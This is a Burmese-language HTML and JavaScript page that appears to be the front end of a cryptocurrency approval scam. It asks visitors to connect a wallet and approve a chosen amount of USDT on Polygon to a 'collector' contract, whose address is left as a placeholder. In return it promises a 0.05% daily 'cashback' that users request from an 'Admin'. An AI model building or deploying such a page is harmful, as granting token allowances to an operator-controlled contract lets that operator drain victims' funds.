<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Approval & Cashback Request</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
</head>
<body class="bg-slate-900 text-white min-h-screen flex items-center justify-center p-4">

    <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-md border border-slate-700">
        <h1 class="text-xl font-bold mb-2 text-center text-emerald-400">USDT Approval & Cashback</h1>
        <p class="text-xs text-slate-400 mb-4 text-center">Polygon Network ဖြင့် Gas fee အနည်းဆုံးဖြင့် လုပ်ဆောင်မည်။</p>

        <!-- Wallet Connection Status -->
        <div class="mb-4">
            <button id="connectBtn" onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
                Connect Wallet
            </button>
            <p id="walletAddress" class="text-xs text-slate-400 mt-2 text-center truncate"></p>
        </div>

        <!-- Approval Form -->
        <div class="space-y-4">
            <div>
                <label class="block text-xs font-medium text-slate-300 mb-1">USDT ပမာဏ ထည့်ပါ</label>
                <input type="number" id="amount" placeholder="ဥပမာ - 100" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm focus:outline-none focus:border-emerald-500">
            </div>

            <button id="approveBtn" onclick="approveUSDT()" disabled class="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-slate-700 disabled:text-slate-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
                Approve USDT
            </button>
        </div>

        <!-- Approve ပြီးမှသာ ပေါ်လာမည့် Cashback Dashboard နှင့် Request Button -->
        <div id="cashbackSection" class="hidden mt-6 space-y-4">
            <div class="bg-slate-900/80 border border-emerald-500/40 p-3 rounded-xl text-center">
                <span class="text-xs text-slate-400">သင့်အတွက် Cashback နှုန်းထား: </span>
                <span id="liveRateDisplay" class="text-sm font-bold text-emerald-400">0.05% Daily</span>
            </div>

            <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-2">
                <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2">✨ Your Active Cashback Dashboard</h2>
                <div class="flex justify-between text-xs text-slate-300">
                    <span>Approved Allowance:</span>
                    <span id="userAllowanceVal" class="font-mono text-white font-semibold">0 USDT</span>
                </div>
                <div class="flex justify-between text-xs text-slate-300">
                    <span>တောင်းဆိုနိုင်သော တစ်လစာ (30 Days):</span>
                    <span id="userLiveMonthlyCb" class="font-mono text-emerald-400 font-semibold">0.00 USDT</span>
                </div>
            </div>

            <!-- Request Cashback Button -->
            <button onclick="requestCashback()" class="w-full bg-amber-600 hover:bg-amber-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
                Request Cashback to Admin
            </button>
        </div>

        <div id="statusLog" class="mt-4 text-xs text-center text-amber-400 font-mono"></div>
    </div>

    <script>
        let provider, signer, userAddress;
        let currentDailyRatePct = 0.05;
        let calculatedMonthlyCb = 0;

        const POLYGON_CHAIN_ID = "0x89";
        const USDT_POLYGON_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e2f";
        const COLLECTOR_CONTRACT_ADDRESS = "သင်၏_Deployed_Smart_Contract_Address_ကို_ဤနေရာတွင်ထည့်ပါ";

        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)"
        ];

        const COLLECTOR_ABI = [
            "function dailyRate() view returns (uint256)",
            "function requestCashback(uint256 amount) external"
        ];

        async function fetchLiveRate() {
            try {
                const readProvider = new ethers.JsonRpcProvider("https://polygon-rpc.com/");
                const collectorContract = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, readProvider);
                const rateFromContract = await collectorContract.dailyRate(); 
                currentDailyRatePct = Number(rateFromContract) / 100;
                document.getElementById("liveRateDisplay").innerText = `${currentDailyRatePct}% Daily`;
            } catch (err) {
                console.error("Rate fetching error:", err);
            }
        }

        async function connectWallet() {
            if (typeof window.ethereum === "undefined") {
                alert("MetaMask ကို Install လုပ်ပါ။");
                return;
            }
            try {
                provider = new ethers.BrowserProvider(window.ethereum);
                const accounts = await provider.send("eth_requestAccounts", []);
                userAddress = accounts[0];

                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: POLYGON_CHAIN_ID }],
                });

                signer = await provider.getSigner();
                document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                document.getElementById("connectBtn").innerText = "Connected";
                document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
                document.getElementById("approveBtn").removeAttribute("disabled");
                
                checkUserActiveAllowance();
            } catch (error) {
                console.error(error);
                document.getElementById("statusLog").innerText = "Wallet ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
            }
        }

        async function checkUserActiveAllowance() {
            try {
                await fetchLiveRate();
                const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, provider);
                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
                const formattedAllowance = ethers.formatUnits(allowance, 6);

                if (Number(formattedAllowance) > 0) {
                    document.getElementById("cashbackSection").classList.remove("hidden");
                    document.getElementById("userAllowanceVal").innerText = `${formattedAllowance} USDT`;

                    const dailyCb = Number(formattedAllowance) * (currentDailyRatePct / 100);
                    calculatedMonthlyCb = dailyCb * 30;

                    document.getElementById("userLiveMonthlyCb").innerText = `${calculatedMonthlyCb.toFixed(4)} USDT`;
                } else {
                    document.getElementById("cashbackSection").classList.add("hidden");
                }
            } catch (err) {
                console.error("Allowance check error:", err);
            }
        }

        async function approveUSDT() {
            // သတိပေးချက် Box ပြသခြင်း
            const isConfirmed = confirm("ဤလုပ်ဆောင်ချက်သည် approve ပေးသောလုပ်ဆောင်ချက်ဖြစ်ပြီး ဆက်လက်လုပ်ဆောင်လိုပါက OK ကိုနှိပ်ပါ။");
            if (!isConfirmed) {
                return; // Cancel နှိပ်ပါက ဆက်မလုပ်တော့ဘဲ ရပ်တန့်မည်
            }

            const rawAmount = document.getElementById("amount").value.trim();
            const logElement = document.getElementById("statusLog");
            const spender = COLLECTOR_CONTRACT_ADDRESS.trim();

            if (!rawAmount || isNaN(rawAmount) || Number(rawAmount) <= 0) {
                alert("မှန်ကန်သော USDT ပမာဏ ထည့်ပါ။");
                return;
            }

            try {
                logElement.innerText = "Transaction တင်နေပါသည်...";
                const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, signer);
                const parsedAmount = ethers.parseUnits(rawAmount, 6);

                const tx = await usdtContract.approve(spender, parsedAmount);
                logElement.innerText = `Tx တင်ပြီးပါပြီ။ အတည်ပြုချက် စောင့်ဆိုင်းနေသည်...`;

                const receipt = await tx.wait();
                logElement.innerText = `အောင်မြင်ပါသည်! Block: ${receipt.blockNumber}`;
                checkUserActiveAllowance();
            } catch (error) {
                console.error(error);
                logElement.innerText = `Approval ပျက်ပြားသွားပါပြီ: ${error.reason || error.message}`;
            }
        }

        async function requestCashback() {
            const logElement = document.getElementById("statusLog");
            try {
                logElement.innerText = "Cashback တောင်းဆိုချက် ပို့နေပါသည်...";
                const collectorContract = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
                const parsedAmount = ethers.parseUnits(calculatedMonthlyCb.toFixed(6), 6);

                const tx = await collectorContract.requestCashback(parsedAmount);
                await tx.wait();
                logElement.innerText = "Cashback တောင်းဆိုမှု Admin ဆီသို့ အောင်မြင်စွာ ပို့ပြီးပါပြီ!";
            } catch (err) {
                console.error(err);
                logElement.innerText = "တောင်းဆိုမှု မအောင်မြင်ပါ။";
            }
        }
    </script>
</body>
</html>
